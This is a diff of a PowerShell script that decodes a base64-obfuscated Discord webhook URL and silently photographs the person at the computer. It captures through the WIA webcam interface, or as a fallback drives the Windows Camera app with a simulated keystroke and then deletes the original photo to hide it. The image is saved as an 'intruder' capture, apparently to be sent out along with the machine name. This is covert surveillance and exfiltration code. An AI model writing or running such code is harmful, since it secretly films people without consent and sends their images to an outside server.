@@ -6,39 +6,56 @@ $e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MTU0NTY3NDU2OTYxMzMyMy9LVX
 $discordWebhookUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))
 
 $filePath = $null
-$camRollDir = Join-Path ([Environment]::GetFolderPath('MyPictures')) "Camera Roll"
-if (!(Test-Path $camRollDir)) {
-    $camRollDir = "C:\Users\$env:USERNAME\Pictures\Camera Roll"
-}
+$captureFile = Join-Path $env:TEMP "intruder_capture.jpg"
 
 try {
-    Start-Process "microsoft.windows.camera:"
-    Start-Sleep -Milliseconds 1800
-
-    Add-Type -AssemblyName System.Windows.Forms
-    [System.Windows.Forms.SendKeys]::SendWait(" ")
-    Start-Sleep -Milliseconds 1200
-
-    Stop-Process -Name WindowsCamera -Force -ErrorAction SilentlyContinue
-
-    if (Test-Path $camRollDir) {
-        $recentPic = Get-ChildItem -Path $camRollDir -Filter "*.jpg" -File -ErrorAction SilentlyContinue | 
-                     Sort-Object LastWriteTime -Descending | 
-                     Select-Object -First 1
-
-        if ($recentPic -ne $null) {
-            $ageSec = ((Get-Date) - $recentPic.LastWriteTime).TotalSeconds
-            if ($ageSec -le 30) {
-                $tempCapture = Join-Path $env:TEMP ("intruder_" + $recentPic.Name)
-                Copy-Item -Path $recentPic.FullName -Destination $tempCapture -Force
-                Remove-Item -Path $recentPic.FullName -Force -ErrorAction SilentlyContinue
-                $filePath = $tempCapture
-            }
+    $wiaDialog = New-Object -ComObject WIA.CommonDialog
+    $wiaDevMgr = New-Object -ComObject WIA.DeviceManager
+    $webcam = $null
+    foreach ($devInfo in $wiaDevMgr.DeviceInfos) {
+        if ($devInfo.Type -eq 2) {
+            $webcam = $devInfo
+            break
         }
     }
-}
-catch {
-    Stop-Process -Name WindowsCamera -Force -ErrorAction SilentlyContinue
+    if ($webcam -ne $null) {
+        $device = $webcam.Connect()
+        $item = $device.Items.Item(1)
+        $img = $item.Transfer("{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}")
+        $img.SaveFile($captureFile)
+        if (Test-Path $captureFile) {
+            $filePath = $captureFile
+        }
+    }
+} catch { }
+
+if ($filePath -eq $null) {
+    try {
+        Start-Process "microsoft.windows.camera:" -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 2500
+        
+        Add-Type -AssemblyName System.Windows.Forms
+        Start-Sleep -Milliseconds 500
+        [System.Windows.Forms.SendKeys]::SendWait(" ")
+        Start-Sleep -Milliseconds 2000
+        Stop-Process -Name WindowsCamera -Force -ErrorAction SilentlyContinue
+
+        $camRollDir = Join-Path ([Environment]::GetFolderPath('MyPictures')) "Camera Roll"
+        if (!(Test-Path $camRollDir)) {
+            $camRollDir = "C:\Users\$env:USERNAME\Pictures\Camera Roll"
+        }
+        if (Test-Path $camRollDir) {
+            $recentPic = Get-ChildItem -Path $camRollDir -Filter "*.jpg" -File -ErrorAction SilentlyContinue | 
+                         Sort-Object LastWriteTime -Descending | Select-Object -First 1
+            if ($recentPic -ne $null -and ((Get-Date) - $recentPic.LastWriteTime).TotalSeconds -le 30) {
+                Copy-Item -Path $recentPic.FullName -Destination $captureFile -Force
+                Remove-Item -Path $recentPic.FullName -Force -ErrorAction SilentlyContinue
+                $filePath = $captureFile
+            }
+        }
+    } catch {
+        Stop-Process -Name WindowsCamera -Force -ErrorAction SilentlyContinue
+    }
 }
 
 $pcName = $env:COMPUTERNAME
